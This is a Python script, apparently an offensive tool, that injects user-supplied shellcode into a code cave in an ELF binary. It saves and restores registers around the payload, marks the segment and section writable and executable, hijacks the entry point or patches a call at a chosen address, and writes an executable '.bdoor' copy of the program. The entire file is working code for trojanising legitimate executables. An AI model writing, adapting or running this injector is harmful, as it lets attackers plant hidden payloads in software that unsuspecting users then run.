#!/usr/bin/env python3

import sys
sys.dont_write_bytecode = True

import struct
from os             import chmod
from argparse       import ArgumentParser
from ELF.ELF        import ELF
from ELF.ELFEnum    import *
from log            import Log


prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i in x))


def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode, breakpoint, arch=ELFHeaderEnum.Class.ELF32.value, legit_instr=None):
    sc_wrapper  = b""
    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57" # pushes
    if arch == ELFHeaderEnum.Class.ELF64.value:
        sc_wrapper += b"\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
    if breakpoint:
        sc_wrapper += b"\xcc"
    sc_wrapper += shellcode
    if arch == ELFHeaderEnum.Class.ELF64.value:
        sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58"
    sc_wrapper += b"\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c" # popes
    if legit_instr:
        sc_wrapper += legit_instr
    else:
        sc_wrapper += b"\x5b"
        if arch == ELFHeaderEnum.Class.ELF64.value:
            sc_wrapper += b"\x48"
        sc_wrapper += b"\x81\xeb"
        sc_wrapper += new_e_entry
        if arch == ELFHeaderEnum.Class.ELF64.value:
            sc_wrapper += b"\x48"
        sc_wrapper += b"\x81\xc3"
        sc_wrapper += legit_e_entry
        sc_wrapper += b"\x53"
    sc_wrapper += b"\xc3"

    return sc_wrapper

def get_args():
    p = ArgumentParser()
    p.add_argument("-b", "--binary", help="Binary path to backdoor", required=True)
    p.add_argument("-s", "--shellcode", help="Path to the raw shellcode (file)", required=True)
    p.add_argument("-l", "--location", help="Hex value of where to put the shellcode", required=True)
    p.add_argument("-e", "--entry", help="Where the shellcode should be called (default: binary entry point)", default=None)
    p.add_argument("--breakpoint", help="Add a breakpoint (\\xcc) at the begining of the shellcode", action='store_true')

    return p.parse_args()


def main():
    args = get_args()
    log = Log(True)

    with open(args.binary, "rb") as f:
        binData = f.read()

    elf = ELF(binData)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    loc = int(args.location, 16)
    entry = int(args.entry, 16) if args.entry else None

    if elf.ei_mag != b"\x7f\x45\x4c\x46":
        log.error("Binary is not an ELF file. Exiting...")
        return 1

    safe_cc = True
    for i in (elf.elf_file[loc], elf.elf_file[loc]+len(shellcode), 1):
        off = loc+i
        if elf.elf_file[off] != 0x00:
            safe_cc = False

    if not safe_cc:
        log.warn("Warning: selected codecave doesn't only contain null bytes")

    secid     = elf.get_section_id_from_offset(loc)
    phid      = elf.get_prog_hdr_id_from_offset(loc)

    if entry:
        legit_loc = entry
    else:
        if elf.ei_class == ELFHeaderEnum.Class.ELF64.value:
            legit_loc  = elf.e_entry
        else:
            legit_loc  = elf.e_entry - elf.program_headers[phid].p_vaddr

    sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode, args.breakpoint, elf.ei_class)

    end_secid = elf.get_section_id_from_offset(loc+len(sc))
    end_phid  = elf.get_prog_hdr_id_from_offset(loc+len(sc))

    if not phid:
        log.error("Error, location is outside of a program header.")
        return

    elif not end_phid:
        log.warn(f"Program header {log.construct(log.colors.fg.GREEN, ProgramHeaderEnum.Type(elf.program_headers[phid].p_type).name, log.colors.format.RESET)} is finishing before the end of the shellcode.")
        resp = input("Increase its size? [Y/n] ")
        if resp.lower() != 'n':
            prev_size = elf.program_headers[phid].p_filesz
            elf.program_headers[phid].p_filesz = elf.program_headers[phid].p_filesz + len(sc)
            elf.program_headers[phid].p_memsz = elf.program_headers[phid].p_memsz + len(sc)
            log.info(f"Previous size: {log.construct(log.colors.fg.CYAN, prettyHex(prev_size), log.colors.format.RESET)} Bytes | New size: {log.construct(log.colors.fg.CYAN, prettyHex(elf.program_headers[phid].p_filesz), log.colors.format.RESET)} Bytes")

    elif elf.program_headers[phid].p_type != elf.program_headers[end_phid].p_type:
        log.error("Error! The shellcode is overlapping 2 program headers. Find another place.")
        elf.program_headers[phid].print_program_header()
        elf.program_headers[end_phid].print_program_header()
        return


    if not secid:
        print("[x] Error, location is outside of a section.")
        return

    elif not end_secid:
        log.warn(f"Section {log.construct(log.colors.fg.GREEN, elf.section_headers[secid].sh_name_str, log.colors.format.RESET)} is finishing before the end of the shellcode.")
        resp = input("Increase its size? [Y/n] ")
        if resp.lower() != 'n':
            prev_size = elf.section_headers[secid].sh_size
            elf.section_headers[secid].sh_size = elf.section_headers[secid].sh_size + len(sc)
            log.info(f"Previous size: {log.construct(log.colors.fg.CYAN, prettyHex(prev_size), log.colors.format.RESET)} Bytes | New size: {log.construct(log.colors.fg.CYAN, prettyHex(elf.section_headers[secid].sh_size), log.colors.format.RESET)} Bytes")

    elif elf.section_headers[secid].sh_name != elf.section_headers[end_secid].sh_name:
        log.error("Error! The shellcode is overlapping 2 sections. Find another place.")
        elf.section_headers[secid].print_section_header()
        elf.section_headers[end_secid].print_section_header()
        return


    log.info("Setting required program header flags...")
    elf.program_headers[phid].setFlags(ProgramHeaderEnum.Flags.PF_X.value | ProgramHeaderEnum.Flags.PF_W.value | ProgramHeaderEnum.Flags.PF_R.value)
    log.success(f"Program header flags: {log.construct(log.colors.fg.MAGENTA, elf.program_headers[phid].prettyFlags(), log.colors.format.RESET)}")

    log.info("Setting required section flags...")
    elf.section_headers[secid].setFlags(SectionHeaderEnum.Flags.SHF_EXECINSTR.value | SectionHeaderEnum.Flags.SHF_WRITE.value | SectionHeaderEnum.Flags.SHF_ALLOC.value)
    log.success(f"Section flags: {log.construct(log.colors.fg.MAGENTA, elf.section_headers[secid].prettyFlags(), log.colors.format.RESET)}")


    if entry:
        new_instr = b"\xe8" + elf.p("i", loc-entry)
        import capstone
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        i=0
        legit_instrs = b""
        for (addr, size, mnem, op_str) in md.disasm_lite(bytes(elf.elf_file[entry:entry+0x10]), entry):
            legit_instrs += elf.elf_file[entry:entry+size]
            i += size
            if i >= len(new_instr):
                break
        new_instr = new_instr + (b"\x90"*(len(legit_instrs)-len(new_instr)))

        elf.elf_file[entry:entry+len(new_instr)] = new_instr
        sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode, args.breakpoint, elf.ei_class, legit_instrs)
    else:
        elf.e_entry = loc \
            if elf.ei_class == ELFHeaderEnum.Class.ELF64.value \
            else loc + elf.program_headers[phid].p_vaddr

    elf.elf_file[loc:loc+len(sc)] = sc

    newBinData = elf.build_elf()

    newFileName = f"./{args.binary.split('/')[-1]}.bdoor"
    with open(newFileName, "wb") as f:
        f.write(newBinData)
    chmod(newFileName, 0o755)

    log.success(f"Backdoored file written at {log.construct(log.colors.fg.YELLOW, newFileName, log.colors.format.RESET)}!")

    return 0



if __name__=='__main__':
    exit(main())
